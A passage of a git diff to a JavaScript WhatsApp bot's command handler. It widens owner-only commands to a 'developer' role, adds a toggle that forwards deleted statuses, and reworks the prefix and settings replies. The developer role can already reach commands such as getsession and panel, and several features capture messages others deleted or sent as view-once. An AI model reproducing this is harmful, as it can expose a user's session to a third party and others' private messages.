         await reply('Restarting now Motherfucker..');
         try {
           const herokuApp = process.env.HEROKU_APP_NAME || process.env.HEROKU_APP || '';
@@ -3282,7 +3622,7 @@ async function startBot() {
 
       // ============ PRESENCE ============
       if (cmd === 'presence') {
-        if (!isOwner(sender, m) && !isMe) { await reply(roast('owner')); return; }
+        if (!isOwner(sender, m) && !isDeveloper(sender, m) && !isMe) { await reply(roast('owner')); return; }
         const v = String(args[0] || '').toLowerCase();
         const pm2 = presenceMap(v);
         if (pm2) { config.PRESENCE = pm2; try { await sock.sendPresenceUpdate(pm2, from); } catch {} await reply('Presence -> *' + v + '*'); }
@@ -3290,7 +3630,7 @@ async function startBot() {
         return;
       }
       if (cmd === 'alwaysonline') {
-        if (!isOwner(sender, m) && !isMe) { await reply(roast('owner')); return; }
+        if (!isOwner(sender, m) && !isDeveloper(sender, m) && !isMe) { await reply(roast('owner')); return; }
         if (args[0] === 'on') { config.ALWAYS_ONLINE = true; config.PRESENCE = 'available'; sock.sendPresenceUpdate('available').catch(() => {}); await reply('Always Online ON'); }
         else if (args[0] === 'off') { config.ALWAYS_ONLINE = false; config.PRESENCE = 'unavailable'; await reply('Always Online OFF'); }
         else await reply('Always Online: *' + (config.ALWAYS_ONLINE ? 'ON' : 'OFF') + '*');
@@ -3298,7 +3638,7 @@ async function startBot() {
       }
 
       // ============ OWNER GATE ============
-      const ownerCmds = ['mode', 'prefix', 'settings', 'autoview', 'autolike', 'autoreact', 'autoread', 'anticall', 'antidelete', 'antiedit', 'antiviewonce', 'broadcast', 'bc', 'users', 'userlist', 'bcusers', 'welcome', 'goodbye', 'setbotname', 'setpp', 'setmenu', 'botimage', 'startmsg', 'font', 'die', 'block', 'unblock', 'antibug', 'antitoxic', 'reaction', 'chatbot', 'getsession', 'session', 'panel', 'ramlist', '1gb', '2gb', '3gb', '4gb', '5gb', 'unli', 'listsrv', 'listusr', 'delsrv', 'delusr', 'join', 'autojoin', 'rejoingroup'];
+      const ownerCmds = ['mode', 'prefix', 'settings', 'autoview', 'autolike', 'autoreact', 'autoread', 'anticall', 'antidelete', 'antideletestatus', 'antiedit', 'antiviewonce', 'broadcast', 'bc', 'users', 'userlist', 'bcusers', 'welcome', 'goodbye', 'setbotname', 'setpp', 'setmenu', 'botimage', 'startmsg', 'font', 'die', 'block', 'unblock', 'antibug', 'antitoxic', 'reaction', 'chatbot', 'getsession', 'session', 'panel', 'ramlist', '1gb', '2gb', '3gb', '4gb', '5gb', 'unli', 'listsrv', 'listusr', 'delsrv', 'delusr', 'join', 'autojoin', 'rejoingroup'];
       if (ownerCmds.includes(cmd) && !isOwner(sender, m) && !isDeveloper(sender, m) && !isMe) { await reply(roast('owner')); return; }
 
       if (cmd === 'mode') {
@@ -3307,9 +3647,15 @@ async function startBot() {
         return;
       }
       if (cmd === 'prefix') {
-        if (!args[0]) { await reply('Current prefix: *' + config.PREFIX + '*'); return; }
-        config.PREFIX = args[0].slice(0, 3);
-        await reply('Prefix -> *' + config.PREFIX + '*');
+        if (!args[0]) {
+          const cur = config.PREFIX || '.';
+          return reply('Current prefix: *' + cur + '*\nMenu shows: *' + cur + 'play* · *' + cur + 'song* · *' + cur + 'menu*');
+        }
+        // allow emoji / symbol prefixes (up to 4 chars for multi-codepoint emoji)
+        const next = String(args[0]).trim().slice(0, 4);
+        if (!next) return reply('Usage: ' + (config.PREFIX || '.') + 'prefix <symbol>\nExamples: .  ,  !  -  ✅');
+        config.PREFIX = next;
+        await reply('Prefix -> *' + config.PREFIX + '*\nMenu will show: *' + config.PREFIX + 'play* · *' + config.PREFIX + 'song* · *' + config.PREFIX + 'menu*');
         return;
       }
       if (cmd === 'font') {
@@ -3337,6 +3683,11 @@ async function startBot() {
       if (cmd === 'chatbot') return toggleCmd('CHATBOT', 'Chatbot');
       if (cmd === 'antitoxic') return toggleCmd('ANTITOXIC', 'AntiToxic');
       if (cmd === 'antibug') return toggleCmd('ANTIBUG', 'AntiBug');
+      if (cmd === 'antideletestatus') {
+        if (args[0] === 'on') { config.ANTI_DELETE_STATUS = true; return reply('AntiDeleteStatus -> *ON*\nStatus deletes will be forwarded.'); }
+        if (args[0] === 'off') { config.ANTI_DELETE_STATUS = false; return reply('AntiDeleteStatus -> *OFF*\nStatus deletes will be ignored.'); }
+        return reply('AntiDeleteStatus: *' + (config.ANTI_DELETE_STATUS ? 'ON' : 'OFF') + '*\nUsage: ' + prefix + 'antideletestatus on/off');
+      }
       if (cmd === 'antidelete' || cmd === 'antiedit' || cmd === 'antiviewonce') {
         const keyMap = { antidelete: 'ANTI_DELETE', antiedit: 'ANTI_EDIT', antiviewonce: 'ANTI_VIEW_ONCE' };
         const key = keyMap[cmd];
@@ -3347,27 +3698,36 @@ async function startBot() {
       }
       if (cmd === 'settings') {
         const on = v => v ? 'ON' : 'OFF';
+        const p = prefix;
         let txt = '⚙️ *' + config.BOT_NAME + ' SETTINGS*\n\n';
-        txt += 'Prefix: *' + config.PREFIX + '*\n';
-        txt += 'Mode: *' + config.MODE + '*\n';
-        txt += 'Font: *' + (config.FONT || 'off') + '*\n';
-        txt += 'Presence: *' + config.PRESENCE + '*\n';
-        txt += 'AlwaysOnline: *' + on(config.ALWAYS_ONLINE) + '*\n';
-        txt += 'AutoView: *' + on(config.AUTO_VIEW_STATUS) + '*\n';
-        txt += 'AutoLike: *' + on(config.AUTO_LIKE_STATUS) + '*\n';
-        txt += 'AutoReact: *' + on(config.AUTO_REACT) + '*\n';
-        txt += 'AutoRead: *' + on(config.AUTO_READ) + '*\n';
-        txt += 'AntiDelete: *' + config.ANTI_DELETE + '*\n';
-        txt += 'AntiEdit: *' + config.ANTI_EDIT + '*\n';
-        txt += 'AntiVO: *' + config.ANTI_VIEW_ONCE + '*\n';
-        txt += 'AntiCall: *' + on(config.ANTI_CALL) + '*\n';
-        txt += 'AntiBug: *' + on(config.ANTIBUG) + '*\n';
-        txt += 'AntiToxic: *' + on(config.ANTITOXIC) + '*\n';
-        txt += 'Welcome: *' + on(config.WELCOME) + '*\n';
-        txt += 'Goodbye: *' + on(config.GOODBYE) + '*\n';
-        txt += 'Chatbot: *' + on(config.CHATBOT) + '*\n';
-        txt += 'Expiry: *' + getExpiryInfo() + '*\n';
-        txt += 'Owner: *' + (config.OWNER_NUMBER || 'not set') + '*\n';
+        txt += '*Core*\n';
+        txt += '• Prefix: *' + config.PREFIX + '*  →  `' + p + 'prefix !`\n';
+        txt += '• Mode: *' + config.MODE + '*  →  `' + p + 'mode public` / `' + p + 'mode private`\n';
+        txt += '• Font: *' + (config.FONT || 'off') + '*  →  `' + p + 'font bold`\n';
+        txt += '• Presence: *' + config.PRESENCE + '*  →  `' + p + 'presence typing`\n';
+        txt += '• AlwaysOnline: *' + on(config.ALWAYS_ONLINE) + '*  →  `' + p + 'alwaysonline on`\n\n';
+        txt += '*Status*\n';
+        txt += '• AutoView: *' + on(config.AUTO_VIEW_STATUS) + '*  →  `' + p + 'autoview on/off`\n';
+        txt += '• AutoLike: *' + on(config.AUTO_LIKE_STATUS) + '*  →  `' + p + 'autolike on/off`\n';
+        txt += '• Status likes emoji  →  `' + p + 'reaction ❤️`\n';
+        txt += '• AntiDeleteStatus: *' + on(config.ANTI_DELETE_STATUS) + '*  →  `' + p + 'antideletestatus on/off`\n\n';
+        txt += '*Protection*\n';
+        txt += '• AntiDelete: *' + config.ANTI_DELETE + '*  →  `' + p + 'antidelete off/dm/chat`\n';
+        txt += '• AntiEdit: *' + config.ANTI_EDIT + '*  →  `' + p + 'antiedit off/dm/chat`\n';
+        txt += '• AntiViewOnce: *' + config.ANTI_VIEW_ONCE + '*  →  `' + p + 'antiviewonce off/dm/chat`\n';
+        txt += '• AntiCall: *' + on(config.ANTI_CALL) + '*  →  `' + p + 'anticall on/off`\n';
+        txt += '• AntiBug: *' + on(config.ANTIBUG) + '*  →  `' + p + 'antibug on/off`\n';
+        txt += '• AntiToxic: *' + on(config.ANTITOXIC) + '*  →  `' + p + 'antitoxic on/off`\n\n';
+        txt += '*Chat*\n';
+        txt += '• AutoReact: *' + on(config.AUTO_REACT) + '*  →  `' + p + 'autoreact on/off`\n';
+        txt += '• AutoRead: *' + on(config.AUTO_READ) + '*  →  `' + p + 'autoread on/off`\n';
+        txt += '• Welcome: *' + on(config.WELCOME) + '*  →  `' + p + 'welcome on/off`\n';
+        txt += '• Goodbye: *' + on(config.GOODBYE) + '*  →  `' + p + 'goodbye on/off`\n';
+        txt += '• Chatbot: *' + on(config.CHATBOT) + '*  →  `' + p + 'chatbot on/off`\n\n';
+        txt += '*Info*\n';
+        txt += '• Expiry: *' + getExpiryInfo() + '*\n';
+        txt += '• Owner: *' + (config.OWNER_NUMBER || 'not set') + '*\n';
+        txt += '\n_dm = send alerts to owner DM · chat = send in same chat_';
         await reply(txt);
         return;
       }
